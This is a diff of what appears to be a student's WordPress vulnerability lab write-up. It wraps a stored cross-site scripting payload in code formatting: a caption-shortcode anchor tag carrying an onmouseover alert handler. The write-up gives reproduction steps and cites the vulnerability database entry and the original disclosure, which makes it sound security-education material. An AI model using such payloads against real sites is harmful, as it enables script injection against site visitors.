@@ -25,7 +25,7 @@ Time spent: **5** hours spent in total
   - [x] GIF Walkthrough: 
   - [x] Steps to recreate: Make a post and in the body of the post enter the following:
   
-  <a href="[caption code=">]</a><a title=" onmouseover=alert('Exploit2!') ">here</a>
+  `<a href="[caption code=">]</a><a title=" onmouseover=alert('Exploit2!') ">here</a>`
   - [x] Affected source code:
    - [WPScan Vulnerability Database Vulnerability #7945](https://wpvulndb.com/vulnerabilities/7945)
    - [Letter by Jouko Pynnönen Regarding the Discovery of the Vulnerability](https://packetstormsecurity.com/files/131644/)
